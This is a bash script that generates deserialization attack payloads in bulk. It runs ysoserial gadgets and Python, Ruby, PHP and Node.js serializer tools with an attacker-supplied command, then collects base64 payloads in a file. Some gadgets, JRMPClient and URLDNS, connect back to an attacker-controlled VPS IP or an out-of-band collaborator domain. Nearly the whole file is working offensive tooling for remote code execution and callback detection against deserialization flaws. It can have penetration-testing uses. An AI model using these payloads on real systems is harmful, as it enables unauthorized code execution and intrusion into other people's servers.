#!/bin/bash

if [ $# -eq 0 ]; then
    echo "Usage: $0 <COMMAND> <VPS_IP> <DOMAIN_COLLAB>"
    exit 1
fi

COMMAND=$1
VPS_IP=$2
DOMAIN_COLLAB=$3
jargadgets="jargadgets.txt"

### JAVA
# ALL SIMPLE GADGETS
while read -r gadget
do
    java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial.jar "$gadget" "$COMMAND" | base64 | tr -d "\n" | tee -a deser.txt
    echo | tee -a deser.txt
done < "$jargadgets"

# JRMPClient GADGET - connect back to you on port 80 or 443
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial.jar "JRMPClient" "$VPS_IP:80" | base64 | tr -d "\n" | tee -a deser.txt
echo | tee -a deser.txt
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial.jar "JRMPClient" "$VPS_IP:443" | base64 | tr -d "\n" | tee -a deser.txt
echo | tee -a deser.txt

java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial.jar "JRMPClient" "jrmpclient.$DOMAIN_COLLAB:80" | base64 | tr -d "\n" | tee -a deser.txt
echo | tee -a deser.txt
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial.jar "JRMPClient" "jrmpclient.$DOMAIN_COLLAB:443" | base64 | tr -d "\n" | tee -a deser.txt
echo | tee -a deser.txt

# URLDNS GADGET - only works with domain (http/https)
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial.jar "URLDNS" "http://urldns.$DOMAIN_COLLAB" | base64 | tr -d "\n" | tee -a deser.txt
echo | tee -a deser.txt
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial.jar "URLDNS" "https://urldns.$DOMAIN_COLLAB" | base64 | tr -d "\n" | tee -a deser.txt
echo | tee -a deser.txt

# PYTHON
python3 python_deser.py "$COMMAND" --base64 --module all | tee -a deser.txt

# RUBY
ruby ruby_deser_v2.rb "$COMMAND" --format base64 | tee -a deser.txt
ruby ruby_deser_v3.rb "$COMMAND" --format base64  | tee -a deser.txt

# PHP
./php_deser.sh "$COMMAND"

# NODEJS
node deser-node.js -s ns -v rce -c "$COMMAND" | base64 | tr -d "\n" | tee -a deser.txt ; echo
node deser-node.js -s fstr -v rce -c "$COMMAND" | base64 | tr -d "\n" | tee -a deser.txt ; echo
node deser-node.js -s cryo -v rce -c "$COMMAND" | base64 | tr -d "\n" | tee -a deser.txt ; echo

node deser-node.js -s ns -v rce -c "$COMMAND" -e b64 | base64 | tr -d "\n" | tee -a deser.txt ; echo
node deser-node.js -s fstr -v rce -c "$COMMAND" -e b64 | base64 | tr -d "\n" | tee -a deser.txt ; echo
node deser-node.js -s cryo -v rce -c "$COMMAND" -e b64 | base64 | tr -d "\n" | tee -a deser.txt ; echo

node deser-node.js -s ns -v rce -c "$COMMAND" -e charcode | base64 | tr -d "\n" | tee -a deser.txt ; echo
node deser-node.js -s fstr -v rce -c "$COMMAND" -e charcode | base64 | tr -d "\n" | tee -a deser.txt ; echo
node deser-node.js -s cryo -v rce -c "$COMMAND" -e charcode | base64 | tr -d "\n" | tee -a deser.txt ; echo

sort -u deser.txt > deser_tmp
mv deser_tmp deser.txt